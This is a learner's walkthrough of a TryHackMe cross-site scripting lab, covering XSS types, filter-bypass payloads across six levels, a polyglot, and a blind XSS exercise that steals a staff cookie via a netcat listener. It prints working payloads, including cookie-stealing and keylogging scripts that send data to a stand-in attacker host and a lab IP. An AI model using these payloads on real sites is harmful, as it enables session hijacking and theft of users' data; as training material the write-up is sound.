# Intro to Cross-site Scripting (XSS)

<img width="1267" height="88" alt="image" src="https://github.com/user-attachments/assets/6b30a8f7-aeec-4fb1-82f6-9f06d9d01a36" />

Through this [room](https://tryhackme.com/room/xss),  I have learnt about the different XSS types, how to create XSS payloads, how to modify  payloads to evade filters, and to detect and exploit XSS vulnerabilities, to gain control of other visitor's browsers.

---

**Cross-Site Scripting(XSS),**  is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users. 

Since XSS is based on JavaScript, it is quite helpful to have a  understanding of the language and of Client-Server requests and responses.

Cross-site scripting vulnerabilities are extremely common. Finding them and reporting them in bug bounty's is well paying.

Below are a few reports of XSS found in massive applications. 

- [XSS found in Shopify](https://hackerone.com/reports/415484)
- [$7,500 for XSS found in Steam chat](https://hackerone.com/reports/409850)
- [$2,500 for XSS in HackerOne](https://hackerone.com/reports/449351)
- [XSS found in Infogram](https://hackerone.com/reports/283825)


---

## XSS Payloads

In XSS, **the payload** is the JavaScript code we wish to be executed on the targets computer. 
There are two parts to the payload:
- **the intention**: what you wish the JavaScript to actually.
- **the modification**: the changes to the code we need to make it execute as every scenario is different.


### Some examples of XSS intentions.

1. **Proof Of Concept:**

This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:

```javascript
<script>alert('XSS');</script>
```

2. **Session Stealing:**

Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. 

The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.

```javascript
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

3. **Key Logger:**

The below code acts as a key logger meaning that anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.


```javascript
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```


4. **Business Logic:**

This payload is a lot more specific than the other examples. It is about calling a particular network resource or a JavaScript function. For instance, a JavaScript function for changing the user's email address called ```user.changeEmail()```. 

The payload could look like this:

```javascript
<script>user.changeEmail('attacker@hacker.thm');</script>
```

Now that the email address for the account has changed, the attacker may perform a reset password attack.

There are  the different types of XSS Vulnerabilities, all requiring slightly different attack payloads and user interaction.
- Reflected XXS
- Stored XXS
- DOM-Based XXS
- Blind XSS

---
## Reflected XXS

Happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

**For instance:**

A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the error parameter in the query string and is built directly into the page source.

<img width="499" height="170" alt="image" src="https://github.com/user-attachments/assets/8d66a818-75e3-4a6c-8a3b-46f4c6c61d0c" />


The application doesn't check the contents of the error parameter, which allows the attacker to insert malicious code.

<img width="659" height="194" alt="image" src="https://github.com/user-attachments/assets/46f11df6-b04a-481f-8144-5f88e1634b32" />

This kind of  vulnerability can be used as per the scenario in the image below:

<img width="645" height="614" alt="image" src="https://github.com/user-attachments/assets/1d3d6ea0-3378-49ab-8d83-2a3f345037e3" />


**Potential Impact:**

The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.

**How to test for Reflected XSS:**

1. First test every possible point of entry including:
   - Parameters in the URL Query String
   - URL File Path
   - Sometimes HTTP Headers (unlikely exploitable in practice)
  
2. After finding some data which is being reflected in the web application, you can then confirm that you can successfully run your JavaScript payload depending on where in the application your code is reflected.

----

## Stored XSS

The XSS payload is stored on the web application eg in a database and then gets run when other users visit the site or web page.

**For instance**

A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.

<img width="903" height="534" alt="image" src="https://github.com/user-attachments/assets/98d40a69-3aa7-48c9-a79c-86067b1291df" />

**Potential Impact:**

The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.

**How to test for Stored XSS:**

1. First test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to.
   For example:
   - Comments on a blog
   - User profile information
   - Website Listings

Sometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads. 

2. Once you've found some data which is being stored in the web application,  you then confirm that you can successfully run your JavaScript payload depending on where in the application your code is reflected.

---

## DOM Based XSS

**DOM(Document Object Model)** is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source. 

This is a diagram of the HTML DOM:

<img width="442" height="244" alt="image" src="https://github.com/user-attachments/assets/65ee47e4-6bd7-436e-9dbe-952479620915" />



[w3.org](https://www.w3.org/TR/REC-DOM-Level-1/introduction.html) explains more on DOM.

**Exploiting the DOM**

**DOM Based XSS** is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.


**For Instance:**

The website's JavaScript gets the contents from the ```window.location.hash``` parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.


**Potential Impact:**

Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.

**How to test for Dom Based XSS:**

DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. 
You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as ```"window.location.x"``` parameters.

When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as ```eval()```.

---

## Blind XSS

**Blind XSS** is similar to a stored XSS  in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

**For Instance:**

A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.

**Potential Impact:**

Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.

**How to test for Blind XSS:**

When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back,usually an HTTP request. This way, you know if and when your code is being executed.

A popular tool for Blind XSS attacks is [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express). Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.


---

## Perfecting your payload


Your payload could have many intentions, from just bringing up a JavaScript alert box to prove we can execute JavaScript on the target website to extracting information from the webpage or user's session.

How your JavaScript payload gets reflected in a target website's code will determine the payload you need to use. 

**Practical:**

In this practical, the aim for each level is to execute the JavaScript alert function with the string THM:

```<script>alert('THM');</script>
```

**Level One:**

In the website, we presented with a form asking us to enter our name, and once we do so,  it will be presents it on a line below.:

<img width="435" height="185" alt="image" src="https://github.com/user-attachments/assets/f389f48c-8e73-4eb3-b171-22a283e6c39d" />


When we view the Page Source, we see the name reflected in the code:

<img width="459" height="82" alt="image" src="https://github.com/user-attachments/assets/f1fa69e0-53d2-471f-913a-1e8fbd494a08" />



Instead of entering your name, we enter a JavaScript Payload: 

```
<script>alert('THM');</script>
```

clicking the enter button, we get an alert popup with the string THM and the page source will look like the following:

<img width="540" height="70" alt="image" src="https://github.com/user-attachments/assets/fc93eccb-16d7-4fb7-8741-2bd608bb53e7" />


**Level Two:**

For this, our name is being reflected in an input tag instead:

<img width="517" height="204" alt="image" src="https://github.com/user-attachments/assets/c420e226-b940-4055-ab38-24066b1402f0" />



Viewing the page source, we see our name reflected inside the value attribute of the input tag:

<img width="595" height="66" alt="image" src="https://github.com/user-attachments/assets/cdafc3dc-40ac-4803-90cd-3efc49625a48" />


The previous JavaScript payload doesnt work because we can't run it from inside the input tag. 

Instead, we need to escape the input tag first so the payload can run properly. 

The payload for this is: 

```
"><script>alert('THM');</script>
```

The important part of the payload is the ```">``` which closes the value parameter and then closes the input tag.

This now closes the input tag properly and allows the JavaScript payload to run:

<img width="572" height="72" alt="image" src="https://github.com/user-attachments/assets/9ad148cf-dc86-4ad8-bd4a-2751e6af44fa" />


Now when we click the enter button, we get an alert popup with the string THM. 


**Level Three:**

Here our name gets reflected inside a HTML tag, this time the textarea tag.

<img width="586" height="75" alt="image" src="https://github.com/user-attachments/assets/621d4411-5148-41e5-b411-b88b01e3546b" />




For this one. We escape the textarea tag a little differently from the input one in Level Two by using the following payload:

```
</textarea><script>alert('THM');</script>
```

This turns this:

<img width="552" height="66" alt="image" src="https://github.com/user-attachments/assets/fe784ea0-7b18-4dc5-b8a1-f7c831a750ca" />

Into This:

<img width="647" height="62" alt="image" src="https://github.com/user-attachments/assets/7fc3833c-3d91-4ebb-9275-369edd631600" />


The important part of the above payload is ```</textarea>,``` which causes the textarea element to close so the script will run.

When we click the enter button, we get an alert popup with the string THM. 

**Level Four:**

This level looks similar to level one, but upon inspecting the page source, you'll see your name gets reflected in some JavaScript code.

<img width="816" height="73" alt="image" src="https://github.com/user-attachments/assets/d8c1dc42-dd67-419e-b1e5-b53124be742d" />


We'll have to escape the existing JavaScript command, so that we may be able to run your code.
We do this with the following payload which will execute your code:

```
';alert('THM');//
```

 The ```'``` closes the field specifying the name, then ```;``` signifies the end of the current command, and the ```//``` at the end makes anything after it a comment rather than executable code.

<img width="592" height="61" alt="image" src="https://github.com/user-attachments/assets/08490a3c-7e77-458b-b853-81b63807f704" />


Now when we click the enter button, you'll get an alert popup with the string THM. 


**Level Five:**

This level looks the same as level one, and our name also gets reflected in the same place. But if we try the ```<script>alert('THM');</script>``` payload, it does't work because the word ``script``  gets removed from your payload because there is a filter that strips out any potentially dangerous words.

<img width="543" height="60" alt="image" src="https://github.com/user-attachments/assets/2d8245a0-9446-4b32-b9d6-f429d382593e" />


When a word gets removed from a string, there's a helpful trick that we can try.

Original Payload:

```
<sscriptcript>alert('THM');</sscriptcript>
```

Text to be removed by the filter is script:

```
<sscriptcript>alert('THM');</sscriptcript>
```

Final Payload (after passing the filter):
```
<script>alert('THM');</script>
```

Thus to bypass the filter, we use the payload 

```
<sscriptcript>alert('THM');</sscriptcript>
```

<img width="497" height="67" alt="image" src="https://github.com/user-attachments/assets/d3521570-6bb4-46ff-8bf1-044d65fb0665" />

Clicking the enter button, you'll get an alert popup with the string THM. 

**Level Six:**

Similar to level two, where we had to escape from the value attribute of an input tag, we can try ```"><script>alert('THM');</script> ``` , but that doesn't seem to work. 

We inspect the page source to see why it doesn't work.

<img width="619" height="83" alt="image" src="https://github.com/user-attachments/assets/5b5e1531-2fef-487a-9bdd-c0c4f8a2cc39" />

<img width="674" height="87" alt="image" src="https://github.com/user-attachments/assets/7457ca3c-0f1d-4fcc-87f0-37baf21418c4" />


We see that the ```< ``` and ```>``` characters get filtered out from our payload, preventing us from escaping the IMG tag. To get around the filter, we can take advantage of the additional attributes of the IMG tag, such as the onload event. 

The onload event executes the code of your choosing once the image specified in the src attribute has loaded onto the web page.

Let's change our payload to reflect this ```/images/cat.jpg" onload="alert('THM')```; and then viewing the page source, we see how this will work.

<img width="567" height="89" alt="image" src="https://github.com/user-attachments/assets/eefd7a60-24cf-48ba-8544-a2e6855b77ee" />


Now when we click the enter button, you'll get an alert popup with the string THM. 

**Polyglots:**


An **XSS polyglot** is a string of text which can escape attributes, tags and bypass filters all in one. 

We could have used the below polyglot on all six levels we've just completed, and it would have executed the code successfully.


```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
---


We obtain the flag after completing the six levels:

<img width="496" height="617" alt="image" src="https://github.com/user-attachments/assets/c2a86bfe-6289-4f5f-888b-f1590634057f" />



## Practical example of Blind XSS

We click on the Customers tab on the top navigation bar and click the "Signup here" link to create an account. Once our account gets set up, we click the Support Tickets tab, which is the feature we will investigate for weaknesses. 

<img width="963" height="481" alt="image" src="https://github.com/user-attachments/assets/3c74aca4-4bd0-49cc-bbb5-caf67c8d9b3a" />

We try creating a support ticket by clicking the green Create Ticket button, enter the subject and content of just the word test and then click the blue Create Ticket button. We now notice our new ticket in the list with an id number which we can click to take us to our newly created ticket. 

<img width="940" height="411" alt="image" src="https://github.com/user-attachments/assets/cc4aebb8-11d5-4f0a-8417-897af5f0be36" />


We investigate how the previously entered text gets reflected on the page. Upon viewing the page source, we can see the text gets placed inside a ```textarea``` tag.

<img width="759" height="426" alt="image" src="https://github.com/user-attachments/assets/68fcb434-915e-4147-b96a-cbcc84b79fc0" />

<img width="607" height="132" alt="image" src="https://github.com/user-attachments/assets/1259fb23-ae4c-45ce-839d-d25ad2b406b3" />



We then create another ticket and see if we can escape the ```textarea``` tag by entering the following payload into the ticket contents:

```
</textarea>test
```

<img width="556" height="301" alt="image" src="https://github.com/user-attachments/assets/4b9c8d32-e5c9-440a-a15c-0ecc19af884f" />

Again, opening the ticket and viewing the page source, we've successfully escaped the ```textarea``` tag.

<img width="538" height="112" alt="image" src="https://github.com/user-attachments/assets/188c8f90-758e-4b25-b9c4-19966387b7c5" />


Let's now expand on this payload to see if we can run JavaScript and confirm that the ticket creation feature is vulnerable to an XSS attack.  
We open another new ticket with the following payload:

```
 </textarea><script>alert('THM');</script>
```

Now when we view the ticket, we  get an alert box with the string THM. We're going to now expand the payload even further and increase the vulnerabilities impact. Because this feature is creating a support ticket, we can be reasonably confident that a staff member will also view this ticket which we could get to execute JavaScript. 

Some helpful information to extract from another user would be their cookies, which we could use to elevate our privileges by hijacking their login session. To do this, our payload will need to extract the user's cookie and exfiltrate it to another webserver server of our choice. Firstly, we'll need to set up a listening server to receive the information.

Using our AttackBox, we set up a listening server using Netcat. 

If we want to listen on port ```9001,``` we issue the command ```nc -l -p 9001```. 

```-l``` option indicates that we want to use Netcat in listen mode
```-p```option is used to specify the port number. 

We can add:
```-n ``` To avoid the resolution of hostnames via DNS, we can add -n; 
```v``` to discover any errors by running Netcat in verbose mode

The final command becomes ```nc -n -l -v -p 9001```, equivalent to nc -nlvp 9001.

<img width="656" height="122" alt="image" src="https://github.com/user-attachments/assets/82183355-bcba-43c1-9c91-01eda0108408" />


Now that we’ve set up the method of receiving the exfiltrated information, let’s build the payload.

```
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
```

Let’s break down the payload:

- The ```</textarea>``` tag closes the text area field.
- The ```<script>``` tag opens an area for us to write JavaScript.
- The ```fetch()``` command makes an HTTP request.
- ```URL_OR_IP``` is either the THM request catcher URL, your IP address from the THM AttackBox, or your IP address on the THM VPN Network.
- ```PORT_NUMBER``` is the port number you are using to listen for connections on the AttackBox.
-?cookie= is the query string containing the victim’s cookies.
 - ```btoa()``` command base64 encodes the victim’s cookies.
- ```document.cookie``` accesses the victim’s cookies for the Acme IT Support Website.
- ```</script>closes``` the JavaScript code block.

Now we create another ticket using the above payload, making sure that we  swap out the ```URL_OR_IP:PORT_NUMBER``` variables with our settings as below:

```</textarea><script>fetch('http://10.113.126.20:9001?cookie=' + btoa(document.cookie) );</script>
````

We then wait up to a minute, and we see the request come through containing the victim’s cookies.

<img width="660" height="238" alt="image" src="https://github.com/user-attachments/assets/829d16a1-8f20-4a5f-a15d-61416ac98a53" />



We base64 decode the cookie value using  https://www.base64decode.org/ to get the value of the staff-session cookie?

<img width="807" height="536" alt="image" src="https://github.com/user-attachments/assets/e72fbd80-001d-47c4-aa6e-87571eb931c9" />













